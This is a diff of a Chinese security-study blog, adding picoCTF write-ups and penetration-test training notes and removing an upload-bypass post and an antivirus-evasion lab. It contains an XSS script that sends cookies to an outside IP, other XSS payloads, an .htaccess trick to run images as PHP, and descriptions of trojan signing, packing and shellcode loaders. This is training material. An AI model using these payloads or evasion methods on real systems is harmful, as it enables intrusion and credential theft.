src&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">            &lt;h3 class&#x3D;&quot;text-muted&quot;&gt;It is my Birthday&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;jumbotron&quot;&gt;</span><br><span class="line">            &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;See if you are invited to my party!&lt;&#x2F;h3&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;br&#x2F;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;upload-form&quot;&gt;</span><br><span class="line">                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;&#x2F;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; id&#x3D;&quot;file1&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; id&#x3D;&quot;file2&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-lg btn-success btn-block&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;footer class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">        &lt;p&gt;&amp;copy; PicoCTF&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;footer&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(document).ready(function()&#123;</span><br><span class="line">    $(&quot;.close&quot;).click(function()&#123;</span><br><span class="line">        $(&quot;myAlert&quot;).alert(&quot;close&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Who are you?<br>打开以后是一句话：Only people who use the official PicoBrowser are allowed on this site!<br>看来是检测浏览器信息了，应该是查的header的User-Agent，改成PicoBrowser就好<br>发现I don’t trust users visiting from another site.<br>那估计是referer吧，改成它自己的网址<br>发现Sorry, this site only worked in 2018.<br>Date参数2018<br>回：I don’t trust users who can be tracked.<br>DNT:dnt<br>回：This website is only for people from Sweden.<br>需要瑞典的ip，xff，找个ip填上去<br>回：You’re in Sweden but you don’t speak Swedish?<br>改Accept-Language:sv<br>拿到flag<br>感想：我那次出的还是保守了</p>
+<p>login<br>又一个login<br>试出来admin是账号，但是似乎没法注释，以这个网站的尿性，应该不是sql，查看源码，发现js：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(async()&#x3D;&gt;&#123;await new Promise((e&#x3D;&gt;window.addEventListener(&quot;load&quot;,e))),document.querySelector(&quot;form&quot;).addEventListener(&quot;submit&quot;,(e&#x3D;&gt;&#123;e.preventDefault();const r&#x3D;&#123;u:&quot;input[name&#x3D;username]&quot;,p:&quot;input[name&#x3D;password]&quot;&#125;,t&#x3D;&#123;&#125;;for(const e in r)t[e]&#x3D;btoa(document.querySelector(r[e]).value).replace(&#x2F;&#x3D;&#x2F;g,&quot;&quot;);return&quot;YWRtaW4&quot;!&#x3D;&#x3D;t.u?alert(&quot;Incorrect Username&quot;):&quot;cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ&quot;!&#x3D;&#x3D;t.p?alert(&quot;Incorrect Password&quot;):void alert(&#96;Correct Password! Your flag is $&#123;atob(t.p)&#125;.&#96;)&#125;))&#125;)();</span><br></pre></td></tr></table></figure>
+<p>用sublime排一下版：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(async () &#x3D;&gt; &#123;</span><br><span class="line">	await new Promise((e &#x3D;&gt; window.addEventListener(&quot;load&quot;, e))), document.querySelector(&quot;form&quot;).addEventListener(&quot;submit&quot;, (e &#x3D;&gt; &#123;</span><br><span class="line">		e.preventDefault();</span><br><span class="line">		const r &#x3D; &#123;</span><br><span class="line">				u: &quot;input[name&#x3D;username]&quot;,</span><br><span class="line">				p: &quot;input[name&#x3D;password]&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			t &#x3D; &#123;&#125;;</span><br><span class="line">		for (const e in r) t[e] &#x3D; btoa(document.querySelector(r[e]).value).replace(&#x2F;&#x3D;&#x2F;g, &quot;&quot;);</span><br><span class="line">		return &quot;YWRtaW4&quot; !&#x3D;&#x3D; t.u ? alert(&quot;Incorrect Username&quot;) : &quot;cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ&quot; !&#x3D;&#x3D; t.p ? alert(&quot;Incorrect Password&quot;) : void alert(&#96;Correct Password! Your flag is $&#123;atob(t.p)&#125;.&#96;)</span><br><span class="line">	&#125;))</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>因为一开始爆出了admin，用base64加密后是YWRtaW4=，和对比的正好差一个=<br>发现貌似会base64加密后把=给去掉<br>本以为后面那个要试着加=，但是好像直接解码就出结果了</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/16/picoctf%E5%88%B7%E9%A2%98/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-pte培训" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/16/pte%E5%9F%B9%E8%AE%AD/">pte培训</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/16/pte%E5%9F%B9%E8%AE%AD/" class="archive-article-date">
+  	<time datetime="2022-01-16T10:00:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">百度：intitle:后台 inurl:admin、</span><br><span class="line">查询子域名作为跳板 site:baidu.com</span><br><span class="line">shodan：port:3389 os:windows7 </span><br><span class="line">永恒之蓝</span><br><span class="line"></span><br><span class="line">查询地址范围：censys（查国外ip段）</span><br><span class="line">cnnic（查国内ip段）</span><br><span class="line"></span><br><span class="line">wappalyzer（查询网站使用了哪些插件）</span><br><span class="line"></span><br><span class="line">密码：qianxin.com</span><br><span class="line"></span><br><span class="line">指纹识别插件：whatrun</span><br><span class="line"></span><br><span class="line">查询是否套过cdn，先ping，然后访问ip，访问不了有可能是套过cdn</span><br><span class="line"></span><br><span class="line">死亡之ping（过去在网吧干不过隔壁，瞄一眼隔壁的ip，掏出这个软件，隔壁的内存就炸了（每被ping一次会开辟64k空间），现在已经有过滤了）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap最常用的模式 In scan, all TCP ports</span><br><span class="line">(nmap -p 1-65535 -T4 -A -v)</span><br><span class="line"></span><br><span class="line">漏洞扫描</span><br><span class="line">针对主机：nusssus（付费）</span><br><span class="line">针对web：wvs，appscan（一键生成中文报告）（开着这个扫，然后手工找，如果手工找不到就交它的报告）（一般选“缺省值”，如果对方已经完成备份，可以随便破坏，就选“入侵式”）</span><br><span class="line">openaws</span><br><span class="line"></span><br><span class="line">HTTP请求</span><br><span class="line">GET 获取</span><br><span class="line">HEAD 仅获取头部</span><br><span class="line">POST 向服务器发送数据</span><br><span class="line">PUT 将请求的主体部分存储在服务器上</span><br><span class="line">TRACE</span><br><span class="line">OPTIONS </span><br><span class="line">DELETE</span><br><span class="line"></span><br><span class="line">爆破字典：C:&#x2F;tools&#x2F;字典相关</span><br><span class="line">不做机器学习的话只能想到把admin和123456固定，然后爆破验证码</span><br><span class="line"></span><br><span class="line">学会了一个token反爆破的爆破方法：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_34376868&#x2F;article&#x2F;details&#x2F;88426478</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ApricityJ&#x2F;p&#x2F;12628962.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(</span><br><span class="line">&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;10.1.11.250:8023?&#39;+</span><br><span class="line">document.cookie+</span><br><span class="line">&#39;&quot;&#x2F;&gt;&#39;</span><br><span class="line">)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">xss训练网站：https:&#x2F;&#x2F;xss.haozi.me&#x2F;#&#x2F;0x00</span><br><span class="line">答案：https:&#x2F;&#x2F;blog.csdn.net&#x2F;n5xxxx__zy&#x2F;article&#x2F;details&#x2F;95524120</span><br><span class="line"></span><br><span class="line">alert(1) 和 alert&#96;1&#96; 效果相同</span><br><span class="line">也可以用这个方法代替&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">onmousemove&#x3D;alert(1)  然后把鼠标移上去就会触发</span><br><span class="line"></span><br><span class="line">0x04有一个真实的xss漏洞  &lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnMScpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">蚁剑可以换别的编码器试试</span><br><span class="line"></span><br><span class="line">买了一大堆防火墙的硬件设备，结果领导说密码太难记，就全是123456</span><br><span class="line"></span><br><span class="line">一个成绩查询网站，领导不知道从哪里听说的，用数据库会造成注入漏洞，所以要求员工“一定不能用数据库”</span><br><span class="line">员工直接？？？</span><br><span class="line">最后写了一个前端脚本，把所有信息直接当到前端，只是把它们都隐藏了，别人查到哪个就显示哪个</span><br><span class="line">整个省的数据直接泄露了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/16/pte%E5%9F%B9%E8%AE%AD/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-pte课程（基础复习）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1171,314 +1384,6 @@ if &#39;flag&#123;&#39; in r.text:
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/09/29/uploadlabs/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-uploadlabs-4" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/28/uploadlabs-4/">uploadlabs-4</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/09/28/uploadlabs-4/" class="archive-article-date">
-  	<time datetime="2021-09-28T13:10:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>提示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</span><br></pre></td></tr></table></figure>
-<p>但是没有禁.htaccess文件，这个文件的作用是定义某些文件通过什么方式读取<br>所以创建一个.htaccess文件<br>写入代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;hack.png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
-<p>意思是把hack.jpg文件当php文件读取<br>（但是需要提前开启这个功能,而且必须是apache漏洞）（phpstudy的修改如下<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34115824/article/details/92053939">https://blog.csdn.net/weixin_34115824/article/details/92053939</a> ）</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/28/uploadlabs-4/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-病毒检测绕过" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <center>病毒检测绕过</center>
-
-<h2 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a>【目的】</h2><p>让学员通过该实验的练习主要掌握：<br>·基本的病毒分类及其制作方法<br>·病毒特征及检测方法<br>·病毒检测的绕过方法</p>
-<h2 id="【环境】"><a href="#【环境】" class="headerlink" title="【环境】"></a>【环境】</h2><p>&emsp;&emsp;操作机：kali，靶机：win10</p>
-<h2 id="【工具】"><a href="#【工具】" class="headerlink" title="【工具】"></a>【工具】</h2><p>&emsp;&emsp;python3，php7，netcat，msf，x64dbg，SigThief， donut，burpsuite ，中国蚁剑</p>
-<h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>·检测技术</p>
-<p>&emsp;&emsp;签名检测技术：PE文件数字签名是Authenticode数字签名格式，用于验证二进制程序的来源和完整性。<br>&emsp;&emsp;基于PKCS #7公开密钥加密标准签名数据，并使用X.509证书关联二进制文件和发布者。<br>&emsp;&emsp;在PE文件数据目录表中，存储着签名信息偏移地址和大小。<br>&emsp;&emsp;签名的验证可以使用Wintrust.lib库中的WinVerifyTrust函数实现。<br>&emsp;&emsp;其中验证包括签名是否存在以及签名是否有效。<br>&emsp;&emsp;签名存在只需要验证签名是否为\x00，签名有效通过hash值判断</p>
-<p>&emsp;&emsp;特征码扫描技术：其基本机制为将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。<br>&emsp;&emsp;杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码。<br>&emsp;&emsp;在病毒样本中，抽取特征代码，抽取的代码比较特殊，不大可能与普通正常程序代码吻合。<br>&emsp;&emsp;抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。</p>
-<p>·免杀技术<br>&emsp;&emsp;签名绕过：签名伪造的方式有两种，一种是在文件尾部添加伪造的签名数据，也就是本实验所用到的方法，但是并不能绕过hash值验证。另一种方法是修改系统签名获取机制。这种方法需要劫持dll难度较大。<br>&emsp;&emsp;加壳免杀：软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。<br>&emsp;&emsp;花指令免杀：花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。<br>&emsp;&emsp;拆分PE文件：在特征码扫描中，为了保证不误杀，往往会提取同一个PE文件的多个特征码进行匹配，只有一个文件同时拥有这些特征码时才会被判定为木马文件，那么就可以利用将一个PE文件拆分成多个文件，分别上传来防止被检测。<br>&emsp;&emsp;加载器编写：shellcode由于可以随意地进行变化和还原，杀软的查杀难度较大。因此将木马shellcode化，再进行shellcode免杀是目前最流行的免杀方式之一。shellcode是一种地址无关代码，只要给他EIP就能够开始运行。shellcode已经有了，但是还需要获得运行权限，而加载器就是为了顺利运行shellcode。<br>&emsp;&emsp;二分PE：对于PE文件类型来说，并不能提取shellcode。相对于shellcode的没有地址标记，bin文件也是如此，所以我们用bin文件代替PE文件。同样的我们也需要一个加载器运行bin文件<br>&emsp;&emsp;混淆免杀：通过一定规律的编码算法，将对metaspolit、CS生成的shellcode进行编码/模糊处理/变形，从原始shellcode中删除所有无效的字符，从而逃避杀毒软件检测。<br>&emsp;&emsp;垃圾字符：有些老式的主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。所以可以通过构造大文件来绕过。</p>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="1-安装及配置环境"><a href="#1-安装及配置环境" class="headerlink" title="1.安装及配置环境"></a>1.安装及配置环境</h3><h4 id="1-1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为-2021。"><a href="#1-1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为-2021。" class="headerlink" title="1.1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为 2021。"></a>1.1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为 2021。</h4>
-
-<h4 id="1-2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。"><a href="#1-2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。" class="headerlink" title="1.2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。"></a>1.2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。</h4>
-
-<h4 id="1-3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。"><a href="#1-3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。" class="headerlink" title="1.3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。"></a>1.3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。</h4>
-
-<h4 id="1-4检查windows-defender"><a href="#1-4检查windows-defender" class="headerlink" title="1.4检查windows defender"></a>1.4检查windows defender</h4><p>&emsp;&emsp;实验中发现windows defender的自动检测功能可能会在开机后以及待机恢复后自动开启。为了防止干扰试验，请先检查windows配置，方法为“设置”——“windows安全中心”——“病毒和威胁防护”——“病毒和威胁防护”设置下的“管理设置”，将“实时防护”改为“关”。</p>
-
-
-<h4 id="1-5开启apache"><a href="#1-5开启apache" class="headerlink" title="1.5开启apache"></a>1.5开启apache</h4><p>&emsp;&emsp;点击桌面上的phpstudy，将“Apache2.4.39”启动</p>
-
-
-<h4 id="1-6本实验的环境拓扑如下图"><a href="#1-6本实验的环境拓扑如下图" class="headerlink" title="1.6本实验的环境拓扑如下图"></a>1.6本实验的环境拓扑如下图</h4>
-<p>准备一台kali操作机一台Win10靶机和一个外网centos操作机来搭建实验环境（因为家用ip一般都会变动，所以用服务器，来避免每次实验都重写木马的外网ip），kali的内网ip为192.168.43.86，监听4444端口，windows10靶机的内网ip为192.168.43.106，centos操作机的外网ip为110.40.245.122，监听9999端口<br>实验上传文件备份于靶机右侧的文件夹中，内含“帮助文档”来介绍文件的用途</p>
-<h3 id="2-签名验证绕过实验"><a href="#2-签名验证绕过实验" class="headerlink" title="2.签名验证绕过实验"></a>2.签名验证绕过实验</h3><h4 id="2-1利用msf生成exe木马"><a href="#2-1利用msf生成exe木马" class="headerlink" title="2.1利用msf生成exe木马"></a>2.1利用msf生成exe木马</h4>
-
-<h4 id="2-2尝试上传"><a href="#2-2尝试上传" class="headerlink" title="2.2尝试上传"></a>2.2尝试上传</h4>
-
-<h4 id="2-3查看结果"><a href="#2-3查看结果" class="headerlink" title="2.3查看结果"></a>2.3查看结果</h4><p>&emsp;&emsp;并没有我们上传的文件，说明被删除。</p>
-
-
-<h4 id="2-4为木马添加签名"><a href="#2-4为木马添加签名" class="headerlink" title="2.4为木马添加签名"></a>2.4为木马添加签名</h4>
-
-<h4 id="2-5再次上传"><a href="#2-5再次上传" class="headerlink" title="2.5再次上传"></a>2.5再次上传</h4>
-
-<h4 id="2-6验证结果"><a href="#2-6验证结果" class="headerlink" title="2.6验证结果"></a>2.6验证结果</h4>
-
-<h3 id="3-加壳绕过实验"><a href="#3-加壳绕过实验" class="headerlink" title="3.加壳绕过实验"></a>3.加壳绕过实验</h3><h4 id="3-1开启模拟病毒检测脚本"><a href="#3-1开启模拟病毒检测脚本" class="headerlink" title="3.1开启模拟病毒检测脚本"></a>3.1开启模拟病毒检测脚本</h4>
-<p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br>&emsp;&emsp;检测脚本代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 